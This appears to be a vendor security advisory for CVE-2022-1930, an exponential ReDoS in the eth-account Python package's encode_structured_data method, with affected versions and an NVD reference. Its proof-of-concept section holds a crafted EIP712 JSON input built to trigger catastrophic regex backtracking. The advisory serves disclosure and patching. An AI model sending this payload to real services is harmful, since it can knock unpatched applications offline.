---
description: CVE-2022-1930 Medium severity. Exponential ReDoS in eth-account leads to denial of service
title: eth-account ReDoS
date_published: "2022-08-11"
last_updated: "2022-08-11"
xray_id: XRAY-248681
vul_id: CVE-2022-1930
cvss: 5.9
severity: medium
discovered_by: Denys Vozniuk
type: vulnerability

---

## Summary

Exponential ReDoS in eth-account leads to denial of service

## Component

[eth-account](https://pypi.org/project/eth-account/)

## Affected versions

eth-account (,0.5.9), fixed in 0.5.9

## Description

An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the eth-account PyPI package, when an attacker is able to supply arbitrary input to the `encode_structured_data` method

## PoC

```
{
        "types": {
                "EIP712Domain": [
                        {"name": "aaaa", "type": "$[11111111111111111111111110"},
                        {"name": "version", "type": "string"},
                        {"name": "chainId", "type": "uint256"},
                        {"name": "verifyingContract", "type": "address"}
                 ]
        }
}
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

[NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-1930)